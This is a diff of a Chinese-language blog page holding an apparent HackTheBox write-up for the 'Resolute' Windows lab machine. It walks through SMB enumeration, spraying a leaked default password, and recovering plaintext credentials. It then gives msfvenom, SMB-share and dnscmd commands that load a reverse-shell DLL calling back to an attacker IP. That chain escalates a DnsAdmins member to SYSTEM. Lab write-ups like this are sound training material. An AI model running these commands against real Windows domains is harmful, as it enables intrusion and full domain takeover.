@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息lab地址：https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;220  10.10.10.169  端口扫描 是一个Windows服务器，没有web enum4linux 使用enum4linux收集信息：   这里能够看到一条信息，其中是一个账号密码： 1index: 0x10a9 RID: 0x457 acb: 0x00000210 Acc">
+    <meta name="description" content="基本信息lab地址：https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;220  10.10.10.169  端口扫描                                                                                                            是一个Windows服">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Resolute - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/04/15/Resolute-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息lab地址：https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;220  10.10.10.169  端口扫描 是一个Windows服务器，没有web enum4linux 使用enum4linux收集信息：   这里能够看到一条信息，其中是一个账号密码： 1index: 0x10a9 RID: 0x457 acb: 0x00000210 Acc">
+<meta property="og:description" content="基本信息lab地址：https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;220  10.10.10.169  端口扫描                                                                                                            是一个Windows服">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041501.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041502.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041503.jpg">
@@ -128,7 +128,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -217,43 +217,115 @@
 <ul>
 <li><h2 id="10-10-10-169"><a href="#10-10-10-169" class="headerlink" title="10.10.10.169"></a>10.10.10.169</h2></li>
 </ul>
-<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041501.jpg" alt=""></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041501.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>是一个Windows服务器，没有web</p>
 <h1 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h1><p> 使用enum4linux收集信息：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041502.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041502.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p> 这里能够看到一条信息，其中是一个账号密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!</span><br></pre></td></tr></table></figure>
 
 <p>但直接使用这个账号密码尝试登录，失败：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041503.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041503.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>这里可以整理出得到的所有用户名：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[ryan] rid:[0x451]</span><br><span class="line">user:[marko] rid:[0x457]</span><br><span class="line">user:[sunita] rid:[0x19c9]</span><br><span class="line">user:[abigail] rid:[0x19ca]</span><br><span class="line">user:[marcus] rid:[0x19cb]</span><br><span class="line">user:[sally] rid:[0x19cc]</span><br><span class="line">user:[fred] rid:[0x19cd]</span><br><span class="line">user:[angela] rid:[0x19ce]</span><br><span class="line">user:[felicia] rid:[0x19cf]</span><br><span class="line">user:[gustavo] rid:[0x19d0]</span><br><span class="line">user:[ulf] rid:[0x19d1]</span><br><span class="line">user:[stevie] rid:[0x19d2]</span><br><span class="line">user:[claire] rid:[0x19d3]</span><br><span class="line">user:[paulo] rid:[0x19d4]</span><br><span class="line">user:[steve] rid:[0x19d5]</span><br><span class="line">user:[annette] rid:[0x19d6]</span><br><span class="line">user:[annika] rid:[0x19d7]</span><br><span class="line">user:[per] rid:[0x19d8]</span><br><span class="line">user:[claude] rid:[0x19d9]</span><br><span class="line">user:[melanie] rid:[0x2775]</span><br><span class="line">user:[zach] rid:[0x2776]</span><br><span class="line">user:[simon] rid:[0x2777]</span><br><span class="line">user:[naoki] rid:[0x2778]</span><br></pre></td></tr></table></figure>
 
 <h1 id="smb-login"><a href="#smb-login" class="headerlink" title="smb_login"></a>smb_login</h1><p>使用得到的用户名字典和前面的密码尝试登录，得到一个正确的账号：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041504.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041504.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">melanie:Welcome123!</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>使用这个账号密码登录，得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041505.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041505.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="搜集信息"><a href="#搜集信息" class="headerlink" title="搜集信息"></a>搜集信息</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir -force &#x3D; ls -a</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041506.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041507.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041506.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041507.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p> 在这个文件中发现了另一个账号的密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br></pre></td></tr></table></figure>
 
 <h1 id="note-txt"><a href="#note-txt" class="headerlink" title="note.txt"></a>note.txt</h1><p>使用ryan账号登录，在桌面发现一个note.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041508.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041508.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>任何系统更改都会在1分钟内恢复，除了管理员账号做的更改</p>
 <p>使用<code>whoami /all</code>查看信息的话，能够发现ryan这个账号在DnsAdmins中：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041509.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041509.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="DNSAdmins-to-Domain-Admins"><a href="#DNSAdmins-to-Domain-Admins" class="headerlink" title="DNSAdmins to Domain Admins"></a>DNSAdmins to Domain Admins</h1><p> 搜索能够得到：</p>
 <p>Windows Privilege Escalation: DNSAdmins to Domain Admins - Server Level DLL Injection<br><a href="https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/" target="_blank" rel="noopener">https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/</a></p>
 <p>基本就这个流程，参数自己改下</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Attack：</span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.160 LPORT=4444 --platform=windows -f dll &gt; ~/Downloads/plugin.dll</span><br><span class="line">python smbserver.py -smb2support SHARE ~/Downloads/</span><br><span class="line">nc -nvlp 4444</span><br><span class="line"></span><br><span class="line">Target：</span><br><span class="line">dnscmd.exe  /config /serverlevelplugindll \\10.10.14.160\SHARE\plugin.dll</span><br><span class="line">sc.exe stop dns</span><br><span class="line">sc.exe start dns</span><br></pre></td></tr></table></figure>
 
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>得到system权限，在Administrator用户桌面得到root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041510.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020041510.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://github.com/portcullislabs/enum4linux" target="_blank" rel="noopener">https://github.com/portcullislabs/enum4linux</a></li>
 <li>Windows Privilege Escalation: DNSAdmins to Domain Admins - Server Level DLL Injection<br><a href="https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/" target="_blank" rel="noopener">https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/</a></li>
